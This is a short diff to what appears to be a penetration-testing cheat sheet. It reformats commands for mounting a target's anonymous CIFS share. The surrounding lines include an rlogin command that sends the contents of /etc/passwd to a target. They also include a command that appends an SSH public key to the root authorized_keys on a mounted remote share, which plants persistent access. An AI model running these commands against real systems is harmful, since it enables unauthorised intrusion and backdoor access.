@@ -759,9 +759,10 @@ rlogin -l "$(cat /etc/passwd)" -p port <target IP>
 # Anonymous Mountable CIFS
 
 mkdir /mnt/temp/
-mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/temp
+mount -t cifs -o username=user,password=password,domain=foo //<target IP>/share /mnt/temp
 
-OS X: mount -t cifs //<target IP>:Users/<user> /mnt/temp/ -o user=<user>,pass=<password>,nounix,sec=ntlmssp
+- OS X
+mount -t cifs -o user=<user>,pass=<password>,nounix,sec=ntlmssp //<target IP>:Users/<user> /mnt/temp/
 
 cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
 ------------------------------------------------------------------------------------------------------------------------------------------------------
